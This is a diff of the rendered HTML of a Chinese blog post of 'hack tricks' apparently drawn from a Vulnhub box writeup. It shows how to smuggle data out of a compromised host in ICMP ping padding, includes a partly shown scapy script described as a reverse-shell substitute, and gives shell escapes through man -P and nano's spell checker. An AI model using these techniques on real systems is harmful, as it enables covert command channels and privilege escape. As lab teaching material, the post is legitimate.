@@ -2,7 +2,7 @@
 <html lang='zh_CN'><head>
   <meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'>
-<meta name='description' content='ping  -p pattern You may specify up to 16 ``pad&rdquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
+<meta name='description' content='ping  -p pattern You may specify up to 16 ``pad&rsquo;&rsquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
  如果渗透到了一台机子却只能往外发ping怎么办？ -p 就可以搞定了。
 举个例子
 ping -c 1 -p `echo -n hello | xxd -ps` anoth_server 然后在another_server上面通过tcpdump就可以接收到hello。
@@ -10,7 +10,7 @@ $ tcpdump -i vboxnet0 -A tcpdump: verbose output suppressed, use -v or -vv for f
 <meta name='theme-color' content='#ffcd00'>
 
 <meta property='og:title' content='几个hack小技巧 • wrfly&#39;s blog'>
-<meta property='og:description' content='ping  -p pattern You may specify up to 16 ``pad&rdquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
+<meta property='og:description' content='ping  -p pattern You may specify up to 16 ``pad&rsquo;&rsquo; bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
  如果渗透到了一台机子却只能往外发ping怎么办？ -p 就可以搞定了。
 举个例子
 ping -c 1 -p `echo -n hello | xxd -ps` anoth_server 然后在another_server上面通过tcpdump就可以接收到hello。
@@ -19,7 +19,7 @@ $ tcpdump -i vboxnet0 -A tcpdump: verbose output suppressed, use -v or -vv for f
 <meta property='og:site_name' content='wrfly&#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='posts'><meta property='article:tag' content='code'><meta property='article:published_time' content='2015-12-05T00:00:00Z'/><meta property='article:modified_time' content='2015-12-05T00:00:00Z'/><meta name='twitter:card' content='summary'>
 
-<meta name="generator" content="Hugo 0.57.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 
   <title>几个hack小技巧 • wrfly&#39;s blog</title>
   <link rel='canonical' href='https://wrfly.kfd.me/posts/%E5%87%A0%E4%B8%AAhack%E5%B0%8F%E6%8A%80%E5%B7%A7/'>
@@ -111,30 +111,24 @@ if (!doNotTrack) {
   
 
   <div class='container entry-content'>
-  
-
-<h3 id="ping">ping</h3>
-
+  <h3 id="ping">ping</h3>
 <blockquote>
 <p>-p pattern
- You  may  specify  up  to  16 ``pad&rdquo; bytes to fill out the packet you send.  This is useful for diagnosing data-dependent problems in a network.  For example, -p ff will cause the sent packet to be filled with all ones.</p>
+You  may  specify  up  to  16 ``pad&rsquo;&rsquo; bytes to fill out the packet you send.  This is useful for diagnosing data-dependent problems in a network.  For example, -p ff will cause the sent packet to be filled with all ones.</p>
 </blockquote>
-
 <p>如果渗透到了一台机子却只能往外发ping怎么办？
 -p 就可以搞定了。</p>
-
 <p>举个例子</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">ping -c 1 -p `echo -n hello | xxd -ps` anoth_server</pre></div>
-<p>然后在another_server上面通过tcpdump就可以接收到hello。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">$ tcpdump -i vboxnet0 -A
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ping -c 1 -p `echo -n hello | xxd -ps` anoth_server
+</code></pre></div><p>然后在another_server上面通过tcpdump就可以接收到hello。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ tcpdump -i vboxnet0 -A
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on vboxnet0, link-type EN10MB (Ethernet), capture size 262144 bytes
 IP 192.168.56.102 &gt; 192.168.56.1: ICMP echo request, id 17686, seq 1, length 64
 E..T..@.@.H...8f..8...:zE......U....lohellohellohellohellohellohellohellohellohelloh
 IP 192.168.56.1 &gt; 192.168.56.102: ICMP echo reply, id 17686, seq 1, length 64
-E..T.L....I...8...8f..BzE......U....lohellohellohellohellohellohellohellohellohelloh</pre></div>
-<p>这有什么用呢？当然是反弹shell啦～</p>
-
+E..T.L....I...8...8f..BzE......U....lohellohellohellohellohellohellohellohellohelloh
+</code></pre></div><p>这有什么用呢？当然是反弹shell啦～</p>
 <p>下面这个脚本是通过发送http请求，让目标主机给本机发送带有执行命令信息的ICMP数据包，从而达到类似反弹shell的结果：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Thread
@@ -164,23 +158,15 @@ date: <span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span
 title: <span style="color:#960050;background-color:#1e0010">几个</span>hack小技巧
       thread<span style="color:#f92672">.</span>join()
     <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
-      <span style="color:#66d9ef">break</span></code></pre></div>
-<h3 id="nano执行命令">nano执行命令</h3>
-
+      <span style="color:#66d9ef">break</span>
+</code></pre></div><h3 id="nano执行命令">nano执行命令</h3>
 <p>之前好像说过man可以执行命令：man -P &lsquo;commands&rsquo; ls</p>
-
 <p>其实nano也有“解释器”，不过这个“解释器”是一个spell checker，检查拼写错误的。</p>
-
 <p>nano -s /bin/sh</p>
-
 <p>然后再里面输入 <code>/bin/bash</code> ，按下 Ctl + T ，你就可以的到一个真正的bash了。</p>
-
 <p>里面也可以输入别的命令让sh执行。</p>
-
 <h3 id="最后的最后">最后的最后</h3>
-
-<p>以上信息的来源：<a href="https://research.g0blin.co.uk/persistence-vulnhub-writeup/" target="_blank">https://research.g0blin.co.uk/persistence-vulnhub-writeup/</a></p>
-
+<p>以上信息的来源：https://research.g0blin.co.uk/persistence-vulnhub-writeup/</p>
 <p>可以玩一下这个盒子，后面都是逆向的内容了。</p>
 
 </div>
